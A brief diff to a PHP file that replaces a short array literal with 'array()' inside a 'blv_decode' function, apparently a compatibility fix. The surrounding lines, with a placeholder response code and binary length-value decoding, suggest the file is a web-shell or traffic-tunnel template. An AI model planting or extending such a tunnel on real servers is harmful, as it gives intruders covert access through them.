@@ -8,7 +8,7 @@ if(version_compare(PHP_VERSION,'5.4.0','>='))@http_response_code(HTTPCODE);
 
 function blv_decode($data) {
     $data_len = strlen($data);
-    $info = [];
+    $info = array();
     $i = 0;
     while ( $i < $data_len) {
         $d = unpack("c1b/N1l", substr($data, $i, 5));
